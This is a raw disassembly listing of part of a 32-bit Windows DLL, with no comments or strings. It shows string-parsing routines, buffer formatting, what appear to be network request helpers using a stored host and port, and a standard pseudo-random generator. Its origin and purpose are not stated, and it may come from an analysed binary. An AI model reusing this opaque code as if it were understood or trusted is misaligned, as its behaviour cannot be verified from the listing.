10004bc0:	00 
10004bc1:	46                   	inc    %esi
10004bc2:	ff 15 30 e1 00 10    	call   *0x1000e130
10004bc8:	85 c0                	test   %eax,%eax
10004bca:	75 34                	jne    0x10004c00
10004bcc:	33 c9                	xor    %ecx,%ecx
10004bce:	eb 0b                	jmp    0x10004bdb
10004bd0:	3b 75 0c             	cmp    0xc(%ebp),%esi
10004bd3:	73 0e                	jae    0x10004be3
10004bd5:	88 44 0d c0          	mov    %al,-0x40(%ebp,%ecx,1)
10004bd9:	46                   	inc    %esi
10004bda:	41                   	inc    %ecx
10004bdb:	8a 44 3e 01          	mov    0x1(%esi,%edi,1),%al
10004bdf:	3a c3                	cmp    %bl,%al
10004be1:	75 ed                	jne    0x10004bd0
10004be3:	46                   	inc    %esi
10004be4:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
10004be8:	c6 44 0d c0 00       	movb   $0x0,-0x40(%ebp,%ecx,1)
10004bed:	74 15                	je     0x10004c04
10004bef:	ff 75 10             	pushl  0x10(%ebp)
10004bf2:	8d 45 c0             	lea    -0x40(%ebp),%eax
10004bf5:	50                   	push   %eax
10004bf6:	ff 15 30 e1 00 10    	call   *0x1000e130
10004bfc:	85 c0                	test   %eax,%eax
10004bfe:	74 04                	je     0x10004c04
10004c00:	33 c0                	xor    %eax,%eax
10004c02:	eb 32                	jmp    0x10004c36
10004c04:	33 c9                	xor    %ecx,%ecx
10004c06:	eb 0b                	jmp    0x10004c13
10004c08:	3b 75 0c             	cmp    0xc(%ebp),%esi
10004c0b:	73 0e                	jae    0x10004c1b
10004c0d:	88 44 0d 80          	mov    %al,-0x80(%ebp,%ecx,1)
10004c11:	46                   	inc    %esi
10004c12:	41                   	inc    %ecx
10004c13:	8a 44 3e 01          	mov    0x1(%esi,%edi,1),%al
10004c17:	3a c3                	cmp    %bl,%al
10004c19:	75 ed                	jne    0x10004c08
10004c1b:	8b 75 14             	mov    0x14(%ebp),%esi
10004c1e:	c6 44 0d 80 00       	movb   $0x0,-0x80(%ebp,%ecx,1)
10004c23:	85 f6                	test   %esi,%esi
10004c25:	74 0c                	je     0x10004c33
10004c27:	8d 45 80             	lea    -0x80(%ebp),%eax
10004c2a:	50                   	push   %eax
10004c2b:	ff 15 9c e1 00 10    	call   *0x1000e19c
10004c31:	89 06                	mov    %eax,(%esi)
10004c33:	33 c0                	xor    %eax,%eax
10004c35:	40                   	inc    %eax
10004c36:	5e                   	pop    %esi
10004c37:	5b                   	pop    %ebx
10004c38:	c9                   	leave  
10004c39:	c2 10 00             	ret    $0x10
10004c3c:	55                   	push   %ebp
10004c3d:	8b ec                	mov    %esp,%ebp
10004c3f:	51                   	push   %ecx
10004c40:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10004c44:	8d 45 fc             	lea    -0x4(%ebp),%eax
10004c47:	50                   	push   %eax
10004c48:	ff 75 10             	pushl  0x10(%ebp)
10004c4b:	ff 75 0c             	pushl  0xc(%ebp)
10004c4e:	ff 75 08             	pushl  0x8(%ebp)
10004c51:	e8 d5 fe ff ff       	call   0x10004b2b
10004c56:	8b 45 fc             	mov    -0x4(%ebp),%eax
10004c59:	c9                   	leave  
10004c5a:	c2 0c 00             	ret    $0xc
10004c5d:	55                   	push   %ebp
10004c5e:	8b ec                	mov    %esp,%ebp
10004c60:	51                   	push   %ecx
10004c61:	53                   	push   %ebx
10004c62:	56                   	push   %esi
10004c63:	8d 74 07 ff          	lea    -0x1(%edi,%eax,1),%esi
10004c67:	8a 1e                	mov    (%esi),%bl
10004c69:	68 b4 e6 00 10       	push   $0x1000e6b4
10004c6e:	57                   	push   %edi
10004c6f:	c6 06 00             	movb   $0x0,(%esi)
10004c72:	ff 15 a0 e1 00 10    	call   *0x1000e1a0
10004c78:	88 1e                	mov    %bl,(%esi)
10004c7a:	85 c0                	test   %eax,%eax
10004c7c:	75 04                	jne    0x10004c82
10004c7e:	33 c0                	xor    %eax,%eax
10004c80:	eb 51                	jmp    0x10004cd3
10004c82:	8d 48 03             	lea    0x3(%eax),%ecx
10004c85:	48                   	dec    %eax
10004c86:	89 4d fc             	mov    %ecx,-0x4(%ebp)
10004c89:	33 f6                	xor    %esi,%esi
10004c8b:	eb 06                	jmp    0x10004c93
10004c8d:	80 38 2f             	cmpb   $0x2f,(%eax)
10004c90:	74 0a                	je     0x10004c9c
10004c92:	48                   	dec    %eax
10004c93:	3b c7                	cmp    %edi,%eax
10004c95:	77 f6                	ja     0x10004c8d
10004c97:	80 38 2f             	cmpb   $0x2f,(%eax)
10004c9a:	75 e2                	jne    0x10004c7e
10004c9c:	40                   	inc    %eax
10004c9d:	50                   	push   %eax
10004c9e:	ff 15 9c e1 00 10    	call   *0x1000e19c
10004ca4:	8b d8                	mov    %eax,%ebx
10004ca6:	53                   	push   %ebx
10004ca7:	e8 38 1d 00 00       	call   0x100069e4
10004cac:	59                   	pop    %ecx
10004cad:	8b 4d 08             	mov    0x8(%ebp),%ecx
10004cb0:	89 01                	mov    %eax,(%ecx)
10004cb2:	85 c0                	test   %eax,%eax
10004cb4:	74 1b                	je     0x10004cd1
10004cb6:	8b 75 0c             	mov    0xc(%ebp),%esi
10004cb9:	53                   	push   %ebx
10004cba:	89 1e                	mov    %ebx,(%esi)
10004cbc:	8b 5d fc             	mov    -0x4(%ebp),%ebx
10004cbf:	53                   	push   %ebx
10004cc0:	50                   	push   %eax
10004cc1:	e8 4a 90 00 00       	call   0x1000dd10
10004cc6:	8b 06                	mov    (%esi),%eax
10004cc8:	83 c4 0c             	add    $0xc,%esp
10004ccb:	2b c7                	sub    %edi,%eax
10004ccd:	8d 74 18 02          	lea    0x2(%eax,%ebx,1),%esi
10004cd1:	8b c6                	mov    %esi,%eax
10004cd3:	5e                   	pop    %esi
10004cd4:	5b                   	pop    %ebx
10004cd5:	c9                   	leave  
10004cd6:	c2 08 00             	ret    $0x8
10004cd9:	55                   	push   %ebp
10004cda:	8b ec                	mov    %esp,%ebp
10004cdc:	5d                   	pop    %ebp
10004cdd:	e9 7b ff ff ff       	jmp    0x10004c5d
10004ce2:	55                   	push   %ebp
10004ce3:	8b ec                	mov    %esp,%ebp
10004ce5:	83 ec 34             	sub    $0x34,%esp
10004ce8:	53                   	push   %ebx
10004ce9:	57                   	push   %edi
10004cea:	56                   	push   %esi
10004ceb:	e8 d5 f3 ff ff       	call   0x100040c5
10004cf0:	8d 45 d0             	lea    -0x30(%ebp),%eax
10004cf3:	6a 1f                	push   $0x1f
10004cf5:	50                   	push   %eax
10004cf6:	e8 34 09 00 00       	call   0x1000562f
10004cfb:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
10004cff:	68 00 04 00 00       	push   $0x400
10004d04:	c6 45 ef 00          	movb   $0x0,-0x11(%ebp)
10004d08:	e8 d7 1c 00 00       	call   0x100069e4
10004d0d:	83 c4 0c             	add    $0xc,%esp
10004d10:	89 45 f8             	mov    %eax,-0x8(%ebp)
10004d13:	85 c0                	test   %eax,%eax
10004d15:	0f 84 92 00 00 00    	je     0x10004dad
10004d1b:	8d 8e 44 06 00 00    	lea    0x644(%esi),%ecx
10004d21:	51                   	push   %ecx
10004d22:	8d 4d d0             	lea    -0x30(%ebp),%ecx
10004d25:	51                   	push   %ecx
10004d26:	ff 75 10             	pushl  0x10(%ebp)
10004d29:	8d 8e 40 04 00 00    	lea    0x440(%esi),%ecx
10004d2f:	51                   	push   %ecx
10004d30:	8d 8e 40 05 00 00    	lea    0x540(%esi),%ecx
10004d36:	51                   	push   %ecx
10004d37:	68 b8 e6 00 10       	push   $0x1000e6b8
10004d3c:	50                   	push   %eax
10004d3d:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10004d43:	bf 00 00 10 00       	mov    $0x100000,%edi
10004d48:	57                   	push   %edi
10004d49:	e8 96 1c 00 00       	call   0x100069e4
10004d4e:	8b d8                	mov    %eax,%ebx
10004d50:	83 c4 20             	add    $0x20,%esp
10004d53:	85 db                	test   %ebx,%ebx
10004d55:	74 4d                	je     0x10004da4
10004d57:	0f b7 86 38 01 00 00 	movzwl 0x138(%esi),%eax
10004d5e:	6a 05                	push   $0x5
10004d60:	57                   	push   %edi
10004d61:	53                   	push   %ebx
10004d62:	ff 75 f8             	pushl  -0x8(%ebp)
10004d65:	50                   	push   %eax
10004d66:	8d 46 38             	lea    0x38(%esi),%eax
10004d69:	50                   	push   %eax
10004d6a:	e8 04 19 00 00       	call   0x10006673
10004d6f:	83 c4 18             	add    $0x18,%esp
10004d72:	89 45 f0             	mov    %eax,-0x10(%ebp)
10004d75:	83 f8 10             	cmp    $0x10,%eax
10004d78:	76 23                	jbe    0x10004d9d
10004d7a:	8d 4d d0             	lea    -0x30(%ebp),%ecx
10004d7d:	51                   	push   %ecx
10004d7e:	50                   	push   %eax
10004d7f:	56                   	push   %esi
10004d80:	8b fb                	mov    %ebx,%edi
10004d82:	e8 b5 fe ff ff       	call   0x10004c3c
10004d87:	3b 45 10             	cmp    0x10(%ebp),%eax
10004d8a:	76 11                	jbe    0x10004d9d
10004d8c:	ff 75 0c             	pushl  0xc(%ebp)
10004d8f:	8b 45 f0             	mov    -0x10(%ebp),%eax
10004d92:	ff 75 08             	pushl  0x8(%ebp)
10004d95:	e8 3f ff ff ff       	call   0x10004cd9
10004d9a:	89 45 f4             	mov    %eax,-0xc(%ebp)
10004d9d:	53                   	push   %ebx
10004d9e:	e8 70 1c 00 00       	call   0x10006a13
10004da3:	59                   	pop    %ecx
10004da4:	ff 75 f8             	pushl  -0x8(%ebp)
10004da7:	e8 67 1c 00 00       	call   0x10006a13
10004dac:	59                   	pop    %ecx
10004dad:	56                   	push   %esi
10004dae:	e8 1c f3 ff ff       	call   0x100040cf
10004db3:	8b 45 f4             	mov    -0xc(%ebp),%eax
10004db6:	5f                   	pop    %edi
10004db7:	5b                   	pop    %ebx
10004db8:	c9                   	leave  
10004db9:	c2 0c 00             	ret    $0xc
10004dbc:	55                   	push   %ebp
10004dbd:	8b ec                	mov    %esp,%ebp
10004dbf:	56                   	push   %esi
10004dc0:	8d b0 f8 06 00 00    	lea    0x6f8(%eax),%esi
10004dc6:	33 c0                	xor    %eax,%eax
10004dc8:	57                   	push   %edi
10004dc9:	40                   	inc    %eax
10004dca:	8b ce                	mov    %esi,%ecx
10004dcc:	e8 49 35 00 00       	call   0x1000831a
10004dd1:	ff 75 08             	pushl  0x8(%ebp)
10004dd4:	8b f8                	mov    %eax,%edi
10004dd6:	e8 0b 04 00 00       	call   0x100051e6
10004ddb:	33 d2                	xor    %edx,%edx
10004ddd:	f7 f7                	div    %edi
10004ddf:	33 c0                	xor    %eax,%eax
10004de1:	56                   	push   %esi
10004de2:	40                   	inc    %eax
10004de3:	8b ca                	mov    %edx,%ecx
10004de5:	e8 3a 35 00 00       	call   0x10008324
10004dea:	5f                   	pop    %edi
10004deb:	5e                   	pop    %esi
10004dec:	5d                   	pop    %ebp
10004ded:	c2 04 00             	ret    $0x4
10004df0:	55                   	push   %ebp
10004df1:	8b ec                	mov    %esp,%ebp
10004df3:	53                   	push   %ebx
10004df4:	56                   	push   %esi
10004df5:	8b 35 34 e1 00 10    	mov    0x1000e134,%esi
10004dfb:	57                   	push   %edi
10004dfc:	ff 75 0c             	pushl  0xc(%ebp)
10004dff:	8b d8                	mov    %eax,%ebx
10004e01:	ff d6                	call   *%esi
10004e03:	40                   	inc    %eax
10004e04:	bf 00 01 00 00       	mov    $0x100,%edi
10004e09:	3b c7                	cmp    %edi,%eax
10004e0b:	76 04                	jbe    0x10004e11
10004e0d:	33 c0                	xor    %eax,%eax
10004e0f:	eb 53                	jmp    0x10004e64
10004e11:	50                   	push   %eax
10004e12:	ff 75 0c             	pushl  0xc(%ebp)
10004e15:	8d 83 40 05 00 00    	lea    0x540(%ebx),%eax
10004e1b:	50                   	push   %eax
10004e1c:	e8 ef 8e 00 00       	call   0x1000dd10
10004e21:	83 c4 0c             	add    $0xc,%esp
10004e24:	ff 75 08             	pushl  0x8(%ebp)
10004e27:	ff d6                	call   *%esi
10004e29:	40                   	inc    %eax
10004e2a:	3b c7                	cmp    %edi,%eax
10004e2c:	77 df                	ja     0x10004e0d
10004e2e:	50                   	push   %eax
10004e2f:	ff 75 08             	pushl  0x8(%ebp)
10004e32:	8d 83 40 04 00 00    	lea    0x440(%ebx),%eax
10004e38:	50                   	push   %eax
10004e39:	e8 d2 8e 00 00       	call   0x1000dd10
10004e3e:	83 c4 0c             	add    $0xc,%esp
10004e41:	ff 75 10             	pushl  0x10(%ebp)
10004e44:	ff d6                	call   *%esi
10004e46:	40                   	inc    %eax
10004e47:	3d 80 00 00 00       	cmp    $0x80,%eax
10004e4c:	77 bf                	ja     0x10004e0d
10004e4e:	50                   	push   %eax
10004e4f:	ff 75 10             	pushl  0x10(%ebp)
10004e52:	81 c3 44 06 00 00    	add    $0x644,%ebx
10004e58:	53                   	push   %ebx
10004e59:	e8 b2 8e 00 00       	call   0x1000dd10
10004e5e:	33 c0                	xor    %eax,%eax
10004e60:	83 c4 0c             	add    $0xc,%esp
10004e63:	40                   	inc    %eax
10004e64:	5f                   	pop    %edi
10004e65:	5e                   	pop    %esi
10004e66:	5b                   	pop    %ebx
10004e67:	5d                   	pop    %ebp
10004e68:	c2 0c 00             	ret    $0xc
10004e6b:	55                   	push   %ebp
10004e6c:	8b ec                	mov    %esp,%ebp
10004e6e:	69 c0 02 01 00 00    	imul   $0x102,%eax,%eax
10004e74:	56                   	push   %esi
10004e75:	ff 75 08             	pushl  0x8(%ebp)
10004e78:	8d 34 08             	lea    (%eax,%ecx,1),%esi
10004e7b:	68 00 01 00 00       	push   $0x100
10004e80:	8d 4e 38             	lea    0x38(%esi),%ecx
10004e83:	e8 64 df ff ff       	call   0x10002dec
10004e88:	85 c0                	test   %eax,%eax
10004e8a:	75 10                	jne    0x10004e9c
10004e8c:	66 8b 45 0c          	mov    0xc(%ebp),%ax
10004e90:	66 89 86 38 01 00 00 	mov    %ax,0x138(%esi)
10004e97:	33 c0                	xor    %eax,%eax
10004e99:	40                   	inc    %eax
10004e9a:	eb 02                	jmp    0x10004e9e
10004e9c:	33 c0                	xor    %eax,%eax
10004e9e:	5e                   	pop    %esi
10004e9f:	5d                   	pop    %ebp
10004ea0:	c2 08 00             	ret    $0x8
10004ea3:	55                   	push   %ebp
10004ea4:	8b ec                	mov    %esp,%ebp
10004ea6:	53                   	push   %ebx
10004ea7:	56                   	push   %esi
10004ea8:	57                   	push   %edi
10004ea9:	ff 75 08             	pushl  0x8(%ebp)
10004eac:	e8 14 f2 ff ff       	call   0x100040c5
10004eb1:	ff 75 0c             	pushl  0xc(%ebp)
10004eb4:	8b 35 34 e1 00 10    	mov    0x1000e134,%esi
10004eba:	33 ff                	xor    %edi,%edi
10004ebc:	ff d6                	call   *%esi
10004ebe:	ff 75 10             	pushl  0x10(%ebp)
10004ec1:	8b d8                	mov    %eax,%ebx
10004ec3:	ff d6                	call   *%esi
10004ec5:	8d 44 03 44          	lea    0x44(%ebx,%eax,1),%eax
10004ec9:	50                   	push   %eax
10004eca:	e8 15 1b 00 00       	call   0x100069e4
10004ecf:	8b f0                	mov    %eax,%esi
10004ed1:	59                   	pop    %ecx
10004ed2:	85 f6                	test   %esi,%esi
10004ed4:	74 29                	je     0x10004eff
10004ed6:	ff 75 10             	pushl  0x10(%ebp)
10004ed9:	ff 75 0c             	pushl  0xc(%ebp)
10004edc:	68 38 e5 00 10       	push   $0x1000e538
10004ee1:	56                   	push   %esi
10004ee2:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10004ee8:	8b 7d 08             	mov    0x8(%ebp),%edi
10004eeb:	83 c4 10             	add    $0x10,%esp
10004eee:	56                   	push   %esi
10004eef:	6a 0e                	push   $0xe
10004ef1:	e8 31 00 00 00       	call   0x10004f27
10004ef6:	56                   	push   %esi
10004ef7:	8b f8                	mov    %eax,%edi
10004ef9:	e8 15 1b 00 00       	call   0x10006a13
10004efe:	59                   	pop    %ecx
10004eff:	ff 75 08             	pushl  0x8(%ebp)
10004f02:	e8 c8 f1 ff ff       	call   0x100040cf
10004f07:	8b c7                	mov    %edi,%eax
10004f09:	5f                   	pop    %edi
10004f0a:	5e                   	pop    %esi
10004f0b:	5b                   	pop    %ebx
10004f0c:	5d                   	pop    %ebp
10004f0d:	c2 0c 00             	ret    $0xc
10004f10:	55                   	push   %ebp
10004f11:	8b ec                	mov    %esp,%ebp
10004f13:	ff 75 0c             	pushl  0xc(%ebp)
10004f16:	68 40 e5 00 10       	push   $0x1000e540
10004f1b:	ff 75 08             	pushl  0x8(%ebp)
10004f1e:	e8 80 ff ff ff       	call   0x10004ea3
10004f23:	5d                   	pop    %ebp
10004f24:	c2 08 00             	ret    $0x8
10004f27:	55                   	push   %ebp
10004f28:	8b ec                	mov    %esp,%ebp
10004f2a:	51                   	push   %ecx
10004f2b:	51                   	push   %ecx
10004f2c:	53                   	push   %ebx
10004f2d:	56                   	push   %esi
10004f2e:	57                   	push   %edi
10004f2f:	e8 91 f1 ff ff       	call   0x100040c5
10004f34:	8b 35 34 e1 00 10    	mov    0x1000e134,%esi
10004f3a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10004f3e:	8d 87 40 05 00 00    	lea    0x540(%edi),%eax
10004f44:	50                   	push   %eax
10004f45:	8d 9f 44 06 00 00    	lea    0x644(%edi),%ebx
10004f4b:	ff d6                	call   *%esi
10004f4d:	53                   	push   %ebx
10004f4e:	8b d8                	mov    %eax,%ebx
10004f50:	ff d6                	call   *%esi
10004f52:	03 d8                	add    %eax,%ebx
10004f54:	8d 87 40 04 00 00    	lea    0x440(%edi),%eax
10004f5a:	50                   	push   %eax
10004f5b:	ff d6                	call   *%esi
10004f5d:	ff 75 0c             	pushl  0xc(%ebp)
10004f60:	03 d8                	add    %eax,%ebx
10004f62:	ff d6                	call   *%esi
10004f64:	8d 44 18 18          	lea    0x18(%eax,%ebx,1),%eax
10004f68:	50                   	push   %eax
10004f69:	e8 76 1a 00 00       	call   0x100069e4
10004f6e:	8b d8                	mov    %eax,%ebx
10004f70:	59                   	pop    %ecx
10004f71:	85 db                	test   %ebx,%ebx
10004f73:	0f 84 80 00 00 00    	je     0x10004ff9
10004f79:	8d 87 44 06 00 00    	lea    0x644(%edi),%eax
10004f7f:	50                   	push   %eax
10004f80:	ff 75 0c             	pushl  0xc(%ebp)
10004f83:	8d 87 40 04 00 00    	lea    0x440(%edi),%eax
10004f89:	ff 75 08             	pushl  0x8(%ebp)
10004f8c:	50                   	push   %eax
10004f8d:	8d 87 40 05 00 00    	lea    0x540(%edi),%eax
10004f93:	50                   	push   %eax
10004f94:	68 f8 e5 00 10       	push   $0x1000e5f8
10004f99:	53                   	push   %ebx
10004f9a:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10004fa0:	83 c4 1c             	add    $0x1c,%esp
10004fa3:	e8 25 12 00 00       	call   0x100061cd
10004fa8:	85 c0                	test   %eax,%eax
10004faa:	74 18                	je     0x10004fc4
10004fac:	0f b7 8f 38 01 00 00 	movzwl 0x138(%edi),%ecx
10004fb3:	6a 01                	push   $0x1
10004fb5:	53                   	push   %ebx
10004fb6:	51                   	push   %ecx
10004fb7:	8d 4f 38             	lea    0x38(%edi),%ecx
10004fba:	51                   	push   %ecx
10004fbb:	e8 6b 0e 00 00       	call   0x10005e2b
10004fc0:	8b f0                	mov    %eax,%esi
10004fc2:	eb 02                	jmp    0x10004fc6
10004fc4:	33 f6                	xor    %esi,%esi
10004fc6:	85 f6                	test   %esi,%esi
10004fc8:	74 28                	je     0x10004ff2
10004fca:	8b c6                	mov    %esi,%eax
10004fcc:	e8 bd 35 00 00       	call   0x1000858e
10004fd1:	85 c0                	test   %eax,%eax
10004fd3:	74 11                	je     0x10004fe6
10004fd5:	6a 05                	push   $0x5
10004fd7:	58                   	pop    %eax
10004fd8:	8b ce                	mov    %esi,%ecx
10004fda:	e8 c5 19 00 00       	call   0x100069a4
10004fdf:	89 45 fc             	mov    %eax,-0x4(%ebp)
10004fe2:	85 c0                	test   %eax,%eax
10004fe4:	75 0c                	jne    0x10004ff2
10004fe6:	e8 75 11 00 00       	call   0x10006160
10004feb:	56                   	push   %esi
10004fec:	e8 5c 2c 00 00       	call   0x10007c4d
10004ff1:	59                   	pop    %ecx
10004ff2:	53                   	push   %ebx
10004ff3:	e8 1b 1a 00 00       	call   0x10006a13
10004ff8:	59                   	pop    %ecx
10004ff9:	57                   	push   %edi
10004ffa:	e8 d0 f0 ff ff       	call   0x100040cf
10004fff:	8b 45 fc             	mov    -0x4(%ebp),%eax
10005002:	5e                   	pop    %esi
10005003:	5b                   	pop    %ebx
10005004:	c9                   	leave  
10005005:	c2 08 00             	ret    $0x8
10005008:	83 60 08 00          	andl   $0x0,0x8(%eax)
1000500c:	83 60 10 00          	andl   $0x0,0x10(%eax)
10005010:	33 c0                	xor    %eax,%eax
10005012:	40                   	inc    %eax
10005013:	c3                   	ret    
10005014:	33 c9                	xor    %ecx,%ecx
10005016:	8b c6                	mov    %esi,%eax
10005018:	89 0e                	mov    %ecx,(%esi)
1000501a:	89 8e ec 06 00 00    	mov    %ecx,0x6ec(%esi)
10005020:	89 8e f0 06 00 00    	mov    %ecx,0x6f0(%esi)
10005026:	89 8e d4 06 00 00    	mov    %ecx,0x6d4(%esi)
1000502c:	89 8e d0 06 00 00    	mov    %ecx,0x6d0(%esi)
10005032:	c7 86 40 06 00 00 d8 	movl   $0x347d8,0x640(%esi)
10005039:	47 03 00 
1000503c:	e8 c7 ff ff ff       	call   0x10005008
10005041:	89 46 04             	mov    %eax,0x4(%esi)
10005044:	3b c1                	cmp    %ecx,%eax
10005046:	74 06                	je     0x1000504e
10005048:	56                   	push   %esi
10005049:	e8 77 f0 ff ff       	call   0x100040c5
1000504e:	8b c6                	mov    %esi,%eax
10005050:	c3                   	ret    
10005051:	53                   	push   %ebx
10005052:	56                   	push   %esi
10005053:	8b f0                	mov    %eax,%esi
10005055:	6a 00                	push   $0x0
10005057:	33 db                	xor    %ebx,%ebx
10005059:	e8 7b f0 ff ff       	call   0x100040d9
1000505e:	56                   	push   %esi
1000505f:	e8 6b f0 ff ff       	call   0x100040cf
10005064:	8b 06                	mov    (%esi),%eax
10005066:	5e                   	pop    %esi
10005067:	5b                   	pop    %ebx
10005068:	85 c0                	test   %eax,%eax
1000506a:	7e 0b                	jle    0x10005077
1000506c:	68 f4 01 00 00       	push   $0x1f4
10005071:	ff 15 44 e1 00 10    	call   *0x1000e144
10005077:	c3                   	ret    
10005078:	68 08 47 00 00       	push   $0x4708
1000507d:	e8 62 19 00 00       	call   0x100069e4
10005082:	59                   	pop    %ecx
10005083:	c3                   	ret    
10005084:	55                   	push   %ebp
10005085:	8b ec                	mov    %esp,%ebp
10005087:	83 ec 54             	sub    $0x54,%esp
1000508a:	68 cc e6 00 10       	push   $0x1000e6cc
1000508f:	6a 40                	push   $0x40
10005091:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
10005096:	58                   	pop    %eax
10005097:	8d 4d ac             	lea    -0x54(%ebp),%ecx
1000509a:	e8 03 de ff ff       	call   0x10002ea2
1000509f:	8b 45 0c             	mov    0xc(%ebp),%eax
100050a2:	ff 75 18             	pushl  0x18(%ebp)
100050a5:	89 45 f0             	mov    %eax,-0x10(%ebp)
100050a8:	8b 45 10             	mov    0x10(%ebp),%eax
100050ab:	89 45 f4             	mov    %eax,-0xc(%ebp)
100050ae:	8b 45 14             	mov    0x14(%ebp),%eax
100050b1:	89 45 f8             	mov    %eax,-0x8(%ebp)
100050b4:	8d 45 ac             	lea    -0x54(%ebp),%eax
100050b7:	50                   	push   %eax
100050b8:	ff 75 08             	pushl  0x8(%ebp)
100050bb:	e8 e7 00 00 00       	call   0x100051a7
100050c0:	c9                   	leave  
100050c1:	c2 14 00             	ret    $0x14
100050c4:	55                   	push   %ebp
100050c5:	8b ec                	mov    %esp,%ebp
100050c7:	81 ec 04 03 00 00    	sub    $0x304,%esp
100050cd:	53                   	push   %ebx
100050ce:	e8 f2 ef ff ff       	call   0x100040c5
100050d3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100050d7:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
100050db:	8d 83 44 06 00 00    	lea    0x644(%ebx),%eax
100050e1:	50                   	push   %eax
100050e2:	8d 83 40 04 00 00    	lea    0x440(%ebx),%eax
100050e8:	74 25                	je     0x1000510f
100050ea:	ff 75 10             	pushl  0x10(%ebp)
100050ed:	ff 75 08             	pushl  0x8(%ebp)
100050f0:	50                   	push   %eax
100050f1:	8d 83 40 05 00 00    	lea    0x540(%ebx),%eax
100050f7:	50                   	push   %eax
100050f8:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
100050fe:	68 f8 e5 00 10       	push   $0x1000e5f8
10005103:	50                   	push   %eax
10005104:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000510a:	83 c4 1c             	add    $0x1c,%esp
1000510d:	eb 20                	jmp    0x1000512f
1000510f:	ff 75 08             	pushl  0x8(%ebp)
10005112:	50                   	push   %eax
10005113:	8d 83 40 05 00 00    	lea    0x540(%ebx),%eax
10005119:	50                   	push   %eax
1000511a:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
10005120:	68 e8 e5 00 10       	push   $0x1000e5e8
10005125:	50                   	push   %eax
10005126:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000512c:	83 c4 18             	add    $0x18,%esp
1000512f:	56                   	push   %esi
10005130:	e8 98 10 00 00       	call   0x100061cd
10005135:	85 c0                	test   %eax,%eax
10005137:	74 1e                	je     0x10005157
10005139:	6a 01                	push   $0x1
1000513b:	8d 8d fc fc ff ff    	lea    -0x304(%ebp),%ecx
10005141:	51                   	push   %ecx
10005142:	0f b7 8b 38 01 00 00 	movzwl 0x138(%ebx),%ecx
10005149:	51                   	push   %ecx
1000514a:	8d 4b 38             	lea    0x38(%ebx),%ecx
1000514d:	51                   	push   %ecx
1000514e:	e8 d8 0c 00 00       	call   0x10005e2b
10005153:	8b f0                	mov    %eax,%esi
10005155:	eb 02                	jmp    0x10005159
10005157:	33 f6                	xor    %esi,%esi
10005159:	85 f6                	test   %esi,%esi
1000515b:	74 3c                	je     0x10005199
1000515d:	8b c6                	mov    %esi,%eax
1000515f:	e8 2a 34 00 00       	call   0x1000858e
10005164:	85 c0                	test   %eax,%eax
10005166:	74 31                	je     0x10005199
10005168:	57                   	push   %edi
10005169:	ff 75 0c             	pushl  0xc(%ebp)
1000516c:	8b fe                	mov    %esi,%edi
1000516e:	e8 06 0f 00 00       	call   0x10006079
10005173:	5f                   	pop    %edi
10005174:	85 c0                	test   %eax,%eax
10005176:	74 21                	je     0x10005199
10005178:	8b cb                	mov    %ebx,%ecx
1000517a:	8b c6                	mov    %esi,%eax
1000517c:	e8 79 10 00 00       	call   0x100061fa
10005181:	e8 07 18 00 00       	call   0x1000698d
10005186:	89 45 fc             	mov    %eax,-0x4(%ebp)
10005189:	85 c0                	test   %eax,%eax
1000518b:	75 0c                	jne    0x10005199
1000518d:	e8 ce 0f 00 00       	call   0x10006160
10005192:	56                   	push   %esi
10005193:	e8 b5 2a 00 00       	call   0x10007c4d
10005198:	59                   	pop    %ecx
10005199:	53                   	push   %ebx
1000519a:	e8 30 ef ff ff       	call   0x100040cf
1000519f:	8b 45 fc             	mov    -0x4(%ebp),%eax
100051a2:	5e                   	pop    %esi
100051a3:	c9                   	leave  
100051a4:	c2 0c 00             	ret    $0xc
100051a7:	55                   	push   %ebp
100051a8:	8b ec                	mov    %esp,%ebp
100051aa:	5d                   	pop    %ebp
100051ab:	e9 14 ff ff ff       	jmp    0x100050c4
100051b0:	57                   	push   %edi
100051b1:	8b f9                	mov    %ecx,%edi
100051b3:	85 ff                	test   %edi,%edi
100051b5:	74 14                	je     0x100051cb
100051b7:	56                   	push   %esi
100051b8:	8b f2                	mov    %edx,%esi
100051ba:	2b f0                	sub    %eax,%esi
100051bc:	8a 10                	mov    (%eax),%dl
100051be:	8a 0c 06             	mov    (%esi,%eax,1),%cl
100051c1:	88 14 06             	mov    %dl,(%esi,%eax,1)
100051c4:	88 08                	mov    %cl,(%eax)
100051c6:	40                   	inc    %eax
100051c7:	4f                   	dec    %edi
100051c8:	75 f2                	jne    0x100051bc
100051ca:	5e                   	pop    %esi
100051cb:	5f                   	pop    %edi
100051cc:	c3                   	ret    
100051cd:	a1 6c 38 01 10       	mov    0x1001386c,%eax
100051d2:	69 c0 fd 43 03 00    	imul   $0x343fd,%eax,%eax
100051d8:	05 c3 9e 26 00       	add    $0x269ec3,%eax
100051dd:	a3 6c 38 01 10       	mov    %eax,0x1001386c
100051e2:	c1 e8 10             	shr    $0x10,%eax
100051e5:	c3                   	ret    
100051e6:	55                   	push   %ebp
100051e7:	8b ec                	mov    %esp,%ebp
100051e9:	51                   	push   %ecx
100051ea:	51                   	push   %ecx
100051eb:	8d 45 f8             	lea    -0x8(%ebp),%eax
100051ee:	50                   	push   %eax
100051ef:	ff 15 08 e1 00 10    	call   *0x1000e108
100051f5:	85 c0                	test   %eax,%eax
100051f7:	74 10                	je     0x10005209
100051f9:	a1 6c 38 01 10       	mov    0x1001386c,%eax
100051fe:	33 45 f8             	xor    -0x8(%ebp),%eax
10005201:	33 45 fc             	xor    -0x4(%ebp),%eax
10005204:	a3 6c 38 01 10       	mov    %eax,0x1001386c
10005209:	e8 bf ff ff ff       	call   0x100051cd
1000520e:	0f b7 c8             	movzwl %ax,%ecx
10005211:	c1 e1 10             	shl    $0x10,%ecx
10005214:	e8 b4 ff ff ff       	call   0x100051cd
10005219:	0f b7 c0             	movzwl %ax,%eax
1000521c:	0b c1                	or     %ecx,%eax
